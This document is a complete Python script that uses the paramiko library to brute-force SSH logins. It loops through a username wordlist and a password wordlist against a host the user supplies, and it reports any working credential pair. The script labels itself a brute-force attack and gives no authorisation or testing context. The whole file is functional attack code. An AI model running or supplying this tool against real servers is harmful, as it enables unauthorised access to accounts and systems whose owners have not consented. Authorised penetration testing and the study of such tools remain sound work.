import paramiko

host = input('Enter the host: ')
port = input('Enter the port (default is 22): ') or 22
username_file = input('Enter the path to the username list file: ')
password_file = input('Enter the path to the password list file: ')

with open(username_file) as username_list:
    for username in username_list:
        username = username.strip("\n")
        with open(password_file) as password_list:
            for password in password_list:
                password = password.strip("\n")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    print("Attempting - Username: {}, Password: {}".format(username, password))
                    ssh.connect(host, port, username, password, timeout=1)
                    print("[>] Valid credentials found - Username: {}, Password: {}".format(username, password))
                    ssh.close()
                    exit(0)  # Exit the script once valid credentials are found
                except paramiko.ssh_exception.AuthenticationException:
                    print("[!] Invalid credentials - Username: {}, Password: {}".format(username, password))
                except Exception as e:
                    print("[!] An error occurred:", str(e))
                    ssh.close()

print("Brute-force attack completed. No valid credentials found.")
